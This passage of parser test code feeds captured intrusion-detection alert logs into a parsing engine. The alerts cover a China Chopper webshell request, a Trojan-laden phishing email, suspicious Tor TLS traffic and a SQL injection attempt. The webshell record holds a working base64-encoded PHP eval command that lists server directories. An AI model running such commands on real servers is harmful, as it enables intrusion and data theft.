close\\r\\nContent-Type: text/html\\r\\n\\r\\n\",\"uri\": \"/1.php\",\"version\": \"HTTP/1.1\",\"referrer\": \"http://192.168.12.192\",\"client_header_names\": \"Cache-Control: no-cache\\r\\nX-Forwarded-For: 53.120.54.227\\r\\nReferer: http://192.168.12.192\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\nHost: 192.168.12.192\\r\\nContent-Length: 752\\r\\nConnection: Close\\r\\n\\r\\n\",\"content_type\": \"application/x-www-form-urlencoded\",\"request_body\": \"c=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=QzpcXERlZGVBTVBaXFxXZWJSb290XFxEZWZhdWx0XFw%3D\", \"resp_body\": \"->|./\\t2017-10-16 09:14:22\\t0\\t0777\\njiaoda/\\t2014-01-16 16:05:42\\t0\\t0777\\n..\\t1970-01-01 00:00:00\\t\\t\\n1.php\\t2017-10-16 09:07:52\\t27\\t0666\\ncook.txt\\t2017-10-16 08:59:32\\t302\\t0666\\ncookies.php\\t2017-10-16 08:51:49\\t301\\t0666\\nphpinfo.php\\t2008-09-03 07:34:06\\t278\\t0666\\nRemoveFromShell.reg\\t2017-10-16 09:14:22\\t112\\t0666\\n|<-\",\"host\": \"192.168.12.192\",\"xff\": \"53.120.54.227\",\"status_msg\": \"OK\",\"user_agent\": \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\",\"content_length\": 752},\"victim_port\": \"80\",\"desc\": \"method:POST;host:192.168.12.192;status_code:200;uri:/1.php;\",\"sub_category\": \"\",\"src_ip_city\": \"北京市\",\"visit_direction_detail\": \"24\",\"reliability\": 10,\"classtype\": \"web-attack\",\"increment\": 0,\"interface\": \"pcap;china_webshell.8af981e451e44563be3cdc1c122add1e.pcap\",\"dst_ip\": \"192.168.12.192\",\"enrichments.dst_ip.malicious\": \"2\",\"src_ip\": \"192.168.12.195\",\"mal_source\": \"192.168.12.192\",\"dst_ip_city\": \"北京市\",\"victim\": \"192.168.12.192\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"2\",\"timestamp\": \"1623381832780\",\"direction\": \"down\",\"severity\": 5,\"enrichments.dst_ip.host_group\": \"Default Terminal Group\",\"enrichments.src_ip.in_range\": 1,\"attacker\": \"192.168.12.195\",\"victim_country\": \"China\",\"attacker_geoloc\": \"39.9047,116.4072\",\"message\": \"Chopper 2011/2014 php webshell connection,vulnerability Was Successfully Exploited\",\"app_proto\": \"http\",\"target\": \"Chopper 2011/2014 php webshell connection,vulnerability Was Successfully Exploited\",\"src_port\": \"1559\",\"attacker_port\": \"1559\",\"engine_type\": \"sde\",\"src_ip_country_code\": \"CN\",\"attacker_country\": \"China\",\"dst_port\": \"80\",\"src_ip_geoloc\": \"39.9047,116.4072\",\"src_ip_country\": \"China\",\"category\": \"webshell\",\"resp_data\": \"\",\"family\": \"\",\"ts\": \"1508145262.880\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "2021-06-11T02: 32: 33.855Z172.16.1.247notice{\"attacker_city\": \"沈阳市\",\"kill_chain\": \"malware-download\",\"enrichments.attacker.in_range\": 1,\"dst_ip_geoloc\": \"41.8056,123.4324\",\"victim_geoloc\": \"41.8056,123.4324\",\"hostip\": \"172.16.1.101\",\"reputation\": \"\",\"dst_ip_country_code\": \"CN\",\"event_source\": \"NDE\",\"file_origin\": \"restore_file\",\"rid\": 11000005,\"uuid\": \"6bf4ea17-6fb2-4e68-b4ea-176fb2be6808\",\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"\",\"commid\": \"1:o/y4n9yD0H6EdsfTvsa6aRR3+9s=\",\"enrichments.dst_ip.in_range\": 1,\"enrichments.victim.in_range\": 1,\"victim_city\": \"沈阳市\",\"enrichments.dst_ip.host_type\": \"1\",\"attacker_country_code\": \"CN\",\"dst_ip_country\": \"China\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"victim_port\": \"25\",\"desc\": \"\",\"sub_category\": \"\",\"src_ip_city\": \"沈阳市\",\"visit_direction_detail\": \"23\",\"reliability\": 10,\"classtype\": \"malware\",\"increment\": 0,\"original_strings\": \"\",\"interface\": \"pcap;恶意邮件定向攻击.e7849df3fb4a42a59df40050c786dada.pcap\",\"dst_ip\": \"172.16.1.233\",\"enrichments.dst_ip.malicious\": \"2\",\"src_ip\": \"172.16.1.240\",\"mal_source\": \"05c45fcfe823340c0ea1d897f19dca7b\",\"dst_ip_city\": \"沈阳市\",\"file\": {\"compress_id\": null,\"package\": \"exe\",\"sha256\": \"d2c4623cdf1a45af6fbf152839813af2ba3ac2596d7d3c5767fbf307546dd94d\",\"gene\": \"True\",\"add_on\": 1.623378646E12,\"ssdeep\": \"1536:IVNVuA9uox768RPlyoeSyN6/J86HRwwHJBpetl5A00WPVfguRQxg+HdU/cOcFd:I0Av7Lf3yN6/J4SMtl5AADitHdU/3\",\"platform\": \"windows\",\"intelligence\": \"True\",\"filename\": \"05c45fcfe823340c0ea1d897f19dca7b\",\"ffilename\": \"c-fcfe-c-ea-d-f-dca-b\",\"av\": \"3/4\",\"fuid\": \"File-ATD-node-1-066d41b8-ca5d-11eb-af0b-0cc47a014738\",\"tag\": \"hide, recon, abnormal, anti-emu, exploit, injection, suspproc, unpacking\",\"md5\": \"05c45fcfe823340c0ea1d897f19dca7b\"},\"victim\": \"172.16.1.233\",\"sensor_ip\": \"172.16.1.101\",\"email\": {\"cc\": \"jianjun <jianjun@xinlang.cn>,shanjie <shanjie@xinlang.cn>,xingf <xingf@xinlang.cn>,ttt <ttt@xinlang.cn>,yyy <yyy@xinlang.cn>,uuu <uuu@xinlang.cn>,zzz <zzz@xinlang.cn>,xxx <xxx@xinlang.cn>,nnn <nnn@xinlang.cn>\",\"date\": \"Thu, 4 Jun 2020 20:38:17 +0800\",\"mime-version\": \"1.0\",\"bcc\": \"zhenjun@xinlang.cn\",\"subject\": \"节日快乐！！！！@@\",\"attachment_names\": \"f5f2171b85c080c36634dcd452cb014b,05c45fcfe823340c0ea1d897f19dca7b\",\"x_mailer\": \"Foxmail 7.2.15.78[cn]\",\"password\": \"k4nwfw\",\"email_body\": \"PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9R0IyMzEyIj48c3R5bGU+Ym9keSB7IGxpbmUtaGVpZ2h0OiAxLjU7IH1ib2R5IHsgZm9udC1zaXplOiAxMC41cHQ7IGZvbnQtZmFtaWx5OiAnTWljcm9zb2Z0IFlhSGVpIFVJJzsgY29sb3I6IHJnYigwLCAwLCAwKTsgbGluZS1oZWlnaHQ6IDEuNTsgfWJvZHkgeyBmb250LXNpemU6IDEwLjVwdDsgZm9udC1mYW1pbHk6ICdNaWNyb3NvZnQgWWFIZWkgVUknOyBjb2xvcjogcmdiKDAsIDAsIDApOyBsaW5lLWhlaWdodDogMS41OyB9PC9zdHlsZT48L2hlYWQ+PGJvZHk+CjxkaXY+PHNwYW4+PC9zcGFuPuelneaCqOW8gOW/gyDoioLml6Xlv6vkuZDvvIHvvIHvvIHvvIE8L2Rpdj4KPGRpdj48YnI+PC9kaXY+PGhyIHN0eWxlPSJ3aWR0aDogMjEwcHg7IGhlaWdodDogMXB4OyIgY29sb3I9IiNiNWM0ZGYiIHNpemU9IjEiIGFsaWduPSJsZWZ0Ij4KPGRpdj48c3Bhbj48ZGl2IHN0eWxlPSJNQVJHSU46IDEwcHg7IEZPTlQtRkFNSUxZOiB2ZXJkYW5hOyBGT05ULVNJWkU6IDEwcHQiPjxkaXY+em91Z2VAeGlubGFuZy5jbjwvZGl2PjwvZGl2Pjwvc3Bhbj48L2Rpdj4KPC9ib2R5PjwvaHRtbD4NCg==\",\"from\": \"\\\"zouge@xinlang.cn\\\" <zouge@xinlang.cn>\",\"to\": \"lanlan <lanlan@baidu.com>,bbb <bbb@baidu.com>,xxx <xxx@baidu.com>\",\"msg_id\": \"<202006042038172263383@xinlang.cn>\",\"status\": \"PARSE_DONE\",\"username\": \"zouge@xinlang.cn\"},\"visit_direction\": \"2\",\"timestamp\": \"1623378736280\",\"severity\": 5,\"enrichments.dst_ip.host_group\": \"Default Server Group\",\"enrichments.src_ip.in_range\": 1,\"attacker\": \"172.16.1.240\",\"victim_country\": \"China\",\"attacker_geoloc\": \"41.8056,123.4324\",\"message\": \"Malicious files hit by genetic detection means\",\"app_proto\": \"smtp\",\"target\": \"05c45fcfe823340c0ea1d897f19dca7b\",\"src_port\": \"52429\",\"attacker_port\": \"52429\",\"engine_type\": \"ais\",\"src_ip_country_code\": \"CN\",\"attacker_country\": \"China\",\"dst_port\": \"25\",\"src_ip_geoloc\": \"41.8056,123.4324\",\"src_ip_country\": \"China\",\"family\": \"AIGENE::Trojan.Generic.4840521\",\"category\": \"variant-malware\",\"resp_data\": \"\",\"ts\": \"1591274288183\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "2021-06-11T09: 03: 00.855Z172.16.1.247notice{\"conn\": {\"duration\": \"836.329329\",\"resp_bytes\": \"542631\",\"resp_pkts\": \"451\",\"orig_bytes\": \"31481\",\"conn_state\": \"SF\",\"orig_pkts\": \"225\"},\"kill_chain\": \"remote-control\",\"dst_ip_geoloc\": \"48.6907,8.9707\",\"victim_geoloc\": \"41.8056,123.4324\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"DE\",\"event_source\": \"NDE\",\"rid\": \"20290002\",\"uuid\": \"66957394-fced-4b2e-9573-94fceddb2e79\",\"ssl\": {\"cipher\": \"Server::  TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\\nClient::  TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,TLS_ECDHE_RSA_WITH_RC4_128_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_EMPTY_RENEGOTIATION_INFO_SCSV\",\"JA3_server_hash\": \"f0c0b894534c50544ec36396c911a9df\",\"server_name\": \"www.fbncs36gptf6b.com\",\"chain\": \"\",\"notAfter\": \"2016-07-06T23:59:59\",\"SSL_server_cert_days\": \"138\",\"curve\": \"\",\"subject\": \"Server::  CN=www.ynjplotp.net\\n\",\"SSL_server_cert_subna\": \"\",\"certificate\": \"MIIBtTCCAR6gAwIBAgIJAI7cEC0PmAy/MA0GCSqGSIb3DQEBBQUAMB4xHDAaBgNVBAMTE3d3dy50ZzViYnpiNWwzdS5jb20wHhcNMTYwMjE5MDAwMDAwWhcNMTYwNzA2MjM1OTU5WjAbMRkwFwYDVQQDExB3d3cueW5qcGxvdHAubmV0MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDInrOuU5nE9gYMEaOJAYz/DiDASAfOQqDF+2oHxACro1BjChUn8S2EoixT8wYxNtZ6ne7xoThnOWGkcdm0zOegN8Fx9LacRwMShAOleLYLJPXFT8MBgQl/tF5YCEXI1yAePZh9x7GsUthwuhjKc6QiK4g0XYKRZEyy7bDUDhhu0wIDAQABMA0GCSqGSIb3DQEBBQUAA4GBAHAMpNQuJwv2cBVnLdKjWcaCbqCmx2Ec/eP0w6Ltgts1MA4XEgFNDM2qEzk59Ggaykj2x+eGbdflFgvnWglAJIZT/6VWC0RJ/8TVA3BLNpXUXw3RHwn9ykrsnrhNk01Q5rCjzrCMtIyEJlFZGd1qhuktTxWVVTYdJYp2g7r6TWuX\",\"version\": \"TLS 1.1\",\"notBefore\": \"2016-02-19T00:00:00\",\"issuer\": \"Server::  CN=www.tg5bbzb5l3u.com\\n\",\"extensions\": \"Server::  renegotiation_info,ec_point_formats,heartbeat\\nClient::  server_name,ec_point_formats,supported_groups,SessionTicket TLS,signature_algorithms,heartbeat\",\"ssl_state\": \"client_hello,server_hello,client_keyx,server_keyx\",\"cert_check_ret\": \"The certificate is not trusted\",\"serial\": \"00:8E:DC:10:2D:0F:98:0C:BF\",\"SSL_server_hash\": \"143e3e69d1ddd274d757f2fb60394e3bb2d83494\",\"expired_cert\": \"\",\"JA3_client_hash\": \"2d8794cb7b52b777bee2695e79c15760\",\"self_signed\": \"F\"},\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"RVRBIOaBtuaEj+WKoOWvhua1gemHj+mAmuS/oeaooeWei+WRveS4re+8jOaUu+WHu+eJueW+geWcqOWRiuitpueahGNvbm4vc3Ns5a2X5q615LiK44CC5ZG95Lit55qE5oOF5oql5pivOiBKQTNfY2xpZW50X2hhc2g6OiAyZDg3OTRjYjdiNTJiNzc3YmVlMjY5NWU3OWMxNTc2MA==\",\"commid\": \"1:1RWiHbDNp5nGP9X+W0ZCiNOehY8=\",\"enrichments.victim.in_range\": 1,\"victim_city\": \"沈阳市\",\"dst_ip_country\": \"Germany\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"victim_port\": \"59279\",\"desc\": \"\",\"sub_category\": \"Malicious encrypted traffic communication\",\"src_ip_city\": \"沈阳市\",\"visit_direction_detail\": \"12\",\"reliability\": 9,\"classtype\": \"malicious-encrypted-traffic\",\"increment\": 1,\"interface\": \"pcap;tor_tls11.77071560f65340cb9623e204920db72b.pcap\",\"dst_ip\": \"213.239.216.222\",\"enrichments.dst_ip.malicious\": \"1\",\"src_ip\": \"10.0.2.15\",\"dst_ip_city\": \"Böblingen\",\"victim\": \"10.0.2.15\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"1\",\"timestamp\": \"1623402176543\",\"severity\": 3,\"enrichments.src_ip.in_range\": 1,\"victim_country\": \"China\",\"attacker\": \"\",\"message\": \"Malicious encrypted traffic with ssl uncorrelated and bidirectional traffic\",\"app_proto\": \"ssl\",\"target\": \"\",\"src_port\": \"59279\",\"attacker_port\": \"\",\"engine_type\": \"ai\",\"src_ip_country_code\": \"CN\",\"dst_port\": \"443\",\"src_ip_geoloc\": \"41.8056,123.4324\",\"src_ip_country\": \"China\",\"family\": \"Malware (own)\",\"category\": \"encrypted-traffic-analysis-traffic\",\"resp_data\": \"\",\"ts\": \"1456334371.511\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "2021-06-11T09: 03: 00.855Z 172.16.1.247 notice {\"conn\": {\"duration\": \"836.329329\",\"resp_bytes\": \"542631\",\"resp_pkts\": \"451\",\"orig_bytes\": \"31481\",\"conn_state\": \"SF\",\"orig_pkts\": \"225\"},\"kill_chain\": \"remote-control\",\"dst_ip_geoloc\": \"48.6907,8.9707\",\"victim_geoloc\": \"41.8056,123.4324\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"DE\",\"event_source\": \"NDE\",\"rid\": \"20290002\",\"uuid\": \"66957394-fced-4b2e-9573-94fceddb2e79\",\"ssl\": {\"cipher\": \"Server::  TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\\nClient::  TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,TLS_ECDHE_RSA_WITH_RC4_128_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_EMPTY_RENEGOTIATION_INFO_SCSV\",\"JA3_server_hash\": \"f0c0b894534c50544ec36396c911a9df\",\"server_name\": \"www.fbncs36gptf6b.com\",\"chain\": \"\",\"notAfter\": \"2016-07-06T23:59:59\",\"SSL_server_cert_days\": \"138\",\"curve\": \"\",\"subject\": \"Server::  CN=www.ynjplotp.net\\n\",\"SSL_server_cert_subna\": \"\",\"certificate\": \"MIIBtTCCAR6gAwIBAgIJAI7cEC0PmAy/MA0GCSqGSIb3DQEBBQUAMB4xHDAaBgNVBAMTE3d3dy50ZzViYnpiNWwzdS5jb20wHhcNMTYwMjE5MDAwMDAwWhcNMTYwNzA2MjM1OTU5WjAbMRkwFwYDVQQDExB3d3cueW5qcGxvdHAubmV0MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDInrOuU5nE9gYMEaOJAYz/DiDASAfOQqDF+2oHxACro1BjChUn8S2EoixT8wYxNtZ6ne7xoThnOWGkcdm0zOegN8Fx9LacRwMShAOleLYLJPXFT8MBgQl/tF5YCEXI1yAePZh9x7GsUthwuhjKc6QiK4g0XYKRZEyy7bDUDhhu0wIDAQABMA0GCSqGSIb3DQEBBQUAA4GBAHAMpNQuJwv2cBVnLdKjWcaCbqCmx2Ec/eP0w6Ltgts1MA4XEgFNDM2qEzk59Ggaykj2x+eGbdflFgvnWglAJIZT/6VWC0RJ/8TVA3BLNpXUXw3RHwn9ykrsnrhNk01Q5rCjzrCMtIyEJlFZGd1qhuktTxWVVTYdJYp2g7r6TWuX\",\"version\": \"TLS 1.1\",\"notBefore\": \"2016-02-19T00:00:00\",\"issuer\": \"Server::  CN=www.tg5bbzb5l3u.com\\n\",\"extensions\": \"Server::  renegotiation_info,ec_point_formats,heartbeat\\nClient::  server_name,ec_point_formats,supported_groups,SessionTicket TLS,signature_algorithms,heartbeat\",\"ssl_state\": \"client_hello,server_hello,client_keyx,server_keyx\",\"cert_check_ret\": \"The certificate is not trusted\",\"serial\": \"00:8E:DC:10:2D:0F:98:0C:BF\",\"SSL_server_hash\": \"143e3e69d1ddd274d757f2fb60394e3bb2d83494\",\"expired_cert\": \"\",\"JA3_client_hash\": \"2d8794cb7b52b777bee2695e79c15760\",\"self_signed\": \"F\"},\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"RVRBIOaBtuaEj+WKoOWvhua1gemHj+mAmuS/oeaooeWei+WRveS4re+8jOaUu+WHu+eJueW+geWcqOWRiuitpueahGNvbm4vc3Ns5a2X5q615LiK44CC5ZG95Lit55qE5oOF5oql5pivOiBKQTNfY2xpZW50X2hhc2g6OiAyZDg3OTRjYjdiNTJiNzc3YmVlMjY5NWU3OWMxNTc2MA==\",\"commid\": \"1:1RWiHbDNp5nGP9X+W0ZCiNOehY8=\",\"enrichments.victim.in_range\": 1,\"victim_city\": \"沈阳市\",\"dst_ip_country\": \"Germany\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"victim_port\": \"59279\",\"desc\": \"\",\"sub_category\": \"Malicious encrypted traffic communication\",\"src_ip_city\": \"沈阳市\",\"visit_direction_detail\": \"12\",\"reliability\": 9,\"classtype\": \"malicious-encrypted-traffic\",\"increment\": 1,\"interface\": \"pcap;tor_tls11.77071560f65340cb9623e204920db72b.pcap\",\"dst_ip\": \"213.239.216.222\",\"enrichments.dst_ip.malicious\": \"1\",\"src_ip\": \"10.0.2.15\",\"dst_ip_city\": \"Böblingen\",\"victim\": \"10.0.2.15\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"1\",\"timestamp\": \"1623402176543\",\"severity\": 3,\"enrichments.src_ip.in_range\": 1,\"victim_country\": \"China\",\"attacker\": \"\",\"message\": \"Malicious encrypted traffic with ssl uncorrelated and bidirectional traffic\",\"app_proto\": \"ssl\",\"target\": \"\",\"src_port\": \"59279\",\"attacker_port\": \"\",\"engine_type\": \"ai\",\"src_ip_country_code\": \"CN\",\"dst_port\": \"443\",\"src_ip_geoloc\": \"41.8056,123.4324\",\"src_ip_country\": \"China\",\"family\": \"Malware (own)\",\"category\": \"encrypted-traffic-analysis-traffic\",\"resp_data\": \"\",\"ts\": \"1456334371.511\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-08-01T01:50:34.729Z 172.16.11.100 notice - - - {\"attacker_city\":\"jinan\",\"kill_chain\":\"attempt-attack\",\"enrichments.attacker.in_range\":1,\"dst_ip_geoloc\":\"36.665261,116.994895\",\"victim_geoloc\":\"36.665261,116.994895\",\"hostip\":\"172.16.3.141\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"10030001\",\"mat_off\":[56],\"uuid\":\"4f19b28d-0a2b-4fb1-99b2-8d0a2bbfb1ae\",\"number\":1,\"hostname\":\"ATD\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"c2VsZWN0IGRpc3RpbmN0IGJ1dHhuLmhhbmRsZXJJZCBhcyBidXR4bl9oYW5kbGVySWQsUEFVU1IudXNlckNvZGUgYXMgUEFVU1JfdXNlckNvZGUsUEFVU1IudXNlck5hbWUgYXMgUEFVU1JfdXNlck5hbWUgZnJvbSBidXR4bkFSIGJ1dHhuIHJpZ2h0IGpvaW4gUEFVU1IgUEFVU1IgIG9uIGJ1dHhuLmhhbmRsZXJJZD1wYXVzci51c2VySWQgICAgd2hlcmUgMT0xIGFuZCBidXR4bi5oYW5kbGVySWQgaXMgbm90IEBAQCBhbmQgKFBBVVNSLnVzZXJDb2RlIGxpa2UgP3VzZXJDb2RlIG9yID91c2VyQ29kZSBpcyBAQEApICBhbmQgKFBBVVNSLnVzZXJOYW1lIGxpa2UgP3VzZXJOYW1lIG9yID91c2VyTmFtZSBpcyBAQEApICA=\",\"commid\":\"1:9xS0BwPh3XBg+7mD9G53UQiwDfE=\",\"enrichments.dst_ip.in_range\":1,\"enrichments.victim.in_range\":1,\"attack_status\":\"attempt\",\"victim_city\":\"jinan\",\"enrichments.dst_ip.host_type\":\"2\",\"attacker_country_code\":\"CN\",\"dst_ip_country\":\"China\",\"victim_country_code\":\"CN\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"2\",\"http\":{\"status_code\":\"200\",\"method\":\"POST\",\"server_header_names\":\"SERVER: Apache-Coyote/1.1\\nSET-COOKIE: locale=zh_CN; Expires=Sat, 19-Aug-2090 05:05:01 GMT\\nCONTENT-TYPE: text/html;charset=utf-8\\nCONTENT-LENGTH: 78\\nDATE: Mon, 01 Aug 2022 01:50:54 GMT\\nCONNECTION: close\\n\",\"uri\":\"/EBP/srchBox.do?method=getSrchBoxData&pageInnerSql=select distinct butxn.handlerId as butxn_handlerId,PAUSR.userCode as PAUSR_userCode,PAUSR.userName as PAUSR_userName from butxnAR butxn right join PAUSR PAUSR on butxn.handlerId=pausr.userId where 1=1 and butxn.handlerId is not @@@ and (PAUSR.userCode like ?userCode or ?userCode is @@@) and (PAUSR.userName like ?userName or ?userName is @@@) &outputFields=butxn_handlerId,PAUSR_userCode,PAUSR_userName&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659318648965-645\",\"version\":\"HTTP/1.1\",\"referrer\":\"http://172.20.1.31:8080/EBP/tradeQuery.do?method=view&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659315144396-688&uuid=mainPageTaskMgr\",\"client_header_names\":\"HOST: 172.20.1.31:8080\\nCONNECTION: keep-alive\\nCONTENT-LENGTH: 45\\nACCEPT: application/json, text/javascript, */*; q=0.01\\nORIGIN: http://172.20.1.31:8080\\nX-REQUESTED-WITH: XMLHttpRequest\\nUSER-AGENT: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36\\nCONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8\\nREFERER: http://172.20.1.31:8080/EBP/tradeQuery.do?method=view&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659315144396-688&uuid=mainPageTaskMgr\\nACCEPT-ENCODING: gzip, deflate\\nACCEPT-LANGUAGE: zh-CN,zh;q=0.9\\nCOOKIE: locale=zh_CN; JSESSIONID=1659B2E296130D00A8F6EE3C5D904228; EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK\\n\",\"request_body\":\"butxn_tranOrgNo=&userCode=zhai&page=1&rows=10\",\"content_type\":\"application/x-www-form-urlencoded\",\"resp_body\":\"{\\\"errorCode\\\":\\\"\\\",\\\"outEntity\\\":{\\\"total\\\":0,\\\"rows\\\":[]},\\\"errorMsg\\\":\\\"\\\",\\\"success\\\":\\\"0\\\"}\",\"host\":\"172.20.1.31\",\"status_msg\":\"OK\",\"xff\":\"\",\"user_agent\":\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36\"},\"mat_fid\":[\"client_header_names\"],\"desc\":\"method:POST;host:172.20.1.31;status_code:200;uri:/EBP/srchBox.do?method=getSrchBoxData&pageInnerSql=select distinct butxn.handlerId as butxn_handlerId,PAUSR.userCode as PAUSR_userCode,PAUSR.userName as PAUSR_userName from butxnAR butxn right join PAUSR PAUSR on butxn.handlerId=pausr.userId where 1=1 and butxn.handlerId is not @@@ and (PAUSR.userCode like ?userCode or ?userCode is @@@) and (PAUSR.userName like ?userName or ?userName is @@@) &outputFields=butxn_handlerId,PAUSR_userCode,PAUSR_userName&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659318648965-645;\",\"sub_category\":\"\",\"src_ip_city\":\"jinan\",\"visit_direction_detail\":\"24\",\"reliability\":8,\"classtype\":\"web-attack\",\"interface\":\"em4\",\"dst_ip\":\"172.20.1.31\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"172.20.8.122\",\"dst_ip_city\":\"jinan\",\"victim\":\"172.20.1.31\",\"sensor_ip\":\"172.16.3.141\",\"visit_direction\":\"2\",\"timestamp\":\"1659318634682\",\"mat_end\":[406],\"severity\":2,\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"enrichments.src_ip.in_range\":1,\"attacker\":\"172.20.8.122\",\"victim_country\":\"China\",\"attacker_geoloc\":\"36.665261,116.994895\",\"message\":\"SQL injection attack is a technique in which the input parameters are not filtered and then directly spliced into the SQL statement to parse and execute a malicious SQL 